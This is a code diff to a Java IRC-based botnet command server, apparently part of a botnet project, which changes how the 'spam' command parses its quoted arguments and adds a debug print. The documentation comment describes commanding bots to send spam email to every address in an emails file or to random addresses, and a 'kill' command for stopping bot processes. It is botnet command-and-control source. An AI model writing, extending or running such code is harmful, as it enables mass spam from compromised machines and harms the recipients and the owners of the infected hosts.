@@ -46,7 +46,7 @@ import org.jibble.pircbot.*;
  * 				Giving all as an argument for 'recipient' will send a spam email to everyone in the emails file and giving 'random' will send a spam email to
  * 				a random person in the bots random emails list. The numbots argument specifies how many bots will send the messages, 
  * 				the number will not be respected if it exceeds the size of the botnet.
- * 				Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]
+ * 				Usage: spam numBots 'xxx' 'yyy' 'zzz' 'subject' recipient [more recipients]
  * 			</dd>
  * 		<dt>Kill</dt>
  * 			<dd> One can specify a list of bot nicks or just say all. This command simply stops the bot process, 
@@ -260,8 +260,8 @@ public class BotnetServer extends PircBot {
 		} else if (s.toLowerCase().startsWith("spam")) {
 			try {
 				String[] peices = s.split("'");
-				String[] firstArgs = Arrays.copyOfRange(peices[0].split(" "), 0, 2);
-				String[] lastArgs = peices[7].split(" ");
+				String[] firstArgs = peices[0].trim().split(" ");
+				String[] lastArgs = peices[8].trim().split(" ");
 				lastArgs = Arrays.copyOfRange(lastArgs, 1, lastArgs.length);
 				
 				List<String> list = new ArrayList<String>();
@@ -271,6 +271,7 @@ public class BotnetServer extends PircBot {
 				list.add(peices[1]);
 				list.add(peices[3]);
 				list.add(peices[5]);
+				list.add(peices[7]);
 				for (String arg : lastArgs) {
 					list.add(arg);
 				}
@@ -278,6 +279,7 @@ public class BotnetServer extends PircBot {
 				String[] parts = (String[])(list.toArray());
 				
 				if (parts.length < 7) {
+					System.out.println(list);
 					System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
 				} else {
 					String[] bots = getUserNames();
